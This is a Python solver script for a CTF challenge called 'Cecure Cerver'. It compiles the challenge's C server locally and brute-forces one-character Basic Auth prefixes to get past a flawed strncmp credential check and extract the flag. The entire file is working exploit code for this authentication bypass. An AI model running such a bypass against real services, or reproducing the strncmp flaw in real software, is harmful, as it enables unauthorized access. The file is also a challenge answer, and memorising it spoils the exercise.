#!/usr/bin/env python3
"""Replay NUS Welcome CTF Cecure Cerver against a local compiled service.

This helper is for local or explicitly authorized CTF challenge artifacts. It
compiles the provided C source, prepares local credential and flag files, then
bruteforces one-hex-character Basic Auth prefixes that satisfy the vulnerable
`strncmp(s1, s2, strlen(s1))` comparison.
"""

from __future__ import annotations

import argparse
import base64
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


FLAG_RE = re.compile(r"(?i)(?:grey|flag|ctf)\{[^{}\r\n]{3,200}\}")
HEX_DIGITS = "0123456789abcdef"


def build_basic_auth_request(username: str, password: str) -> bytes:
    token = base64.b64encode(f"{username}:{password}".encode()).decode()
    return (
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        f"Authorization: Basic {token}\r\n"
        "\r\n"
    ).encode()


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if candidate not in flags:
            flags.append(candidate)
    return flags


def solve_local_source(source: Path, uname_path: Path, pwd_path: Path, flag_path: Path, timeout: float = 5.0) -> str:
    compiler = shutil.which("clang") or shutil.which("gcc")
    if not compiler:
        raise RuntimeError("clang or gcc is required to compile server.c locally")
    with tempfile.TemporaryDirectory(prefix="forgeflag-cecure-") as tmpdir:
        workdir = Path(tmpdir)
        binary = workdir / "server"
        subprocess.run([compiler, str(source), "-o", str(binary)], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        shutil.copy2(uname_path, workdir / "uname.txt")
        shutil.copy2(pwd_path, workdir / "pwd.txt")
        shutil.copy2(flag_path, workdir / "flag.txt")

        for username in HEX_DIGITS:
            for password in HEX_DIGITS:
                response = _run_one_request(binary, workdir, build_basic_auth_request(username, password), timeout)
                flags = extract_flags(response)
                if flags:
                    print(f"credential_prefix: {username}:{password}")
                    print("method: Basic Auth one-character prefix bypass")
                    print(f"flag: {flags[0]}")
                    return flags[0]
    raise RuntimeError("no one-character credential prefix produced a flag")


def _run_one_request(binary: Path, cwd: Path, request: bytes, timeout: float) -> str:
    completed = subprocess.run(
        [str(binary)],
        cwd=str(cwd),
        input=request,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    return completed.stdout.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay NUS Cecure Cerver from local CTF artifacts.")
    parser.add_argument("--source", type=Path, required=True, help="path to server.c")
    parser.add_argument("--uname", type=Path, required=True, help="path to local uname.txt")
    parser.add_argument("--pwd", type=Path, required=True, help="path to local pwd.txt")
    parser.add_argument("--flag", type=Path, required=True, help="path to local flag.txt used by the challenge service")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()
    try:
        solve_local_source(
            args.source.resolve(),
            args.uname.resolve(),
            args.pwd.resolve(),
            args.flag.resolve(),
            timeout=args.timeout,
        )
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
